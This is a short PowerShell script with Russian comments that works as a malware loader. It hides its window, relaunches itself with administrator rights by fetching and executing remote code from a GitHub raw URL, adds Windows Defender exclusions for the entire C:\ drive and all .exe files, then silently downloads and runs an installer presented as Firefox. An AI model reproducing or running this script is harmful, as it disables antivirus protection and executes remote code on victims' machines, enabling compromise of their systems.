$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# 1. нормальный перезапуск от админа
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # используем encodedcommand или просто передаем скрипт-блок правильно
    # добавил -WindowStyle Hidden чтобы не мелькало, если не хочешь видеть окно
    $scriptPath = "https://raw.githubusercontent.com/sanek421/13232/main/bibriki"
    start-process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {iex(irm '$scriptPath')}`"" -Verb RunAs
    exit
}

# 2. исключения (теперь точно от админа)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1

# 3. качаем и запускаем
$url = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
$out = "$env:TEMP\Firefox%20Installer.exe"

# используем curl (iwr)
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    if (Test-Path $out) {
        Start-Process -FilePath $out -WindowStyle Hidden
    }
} catch {
    exit
}
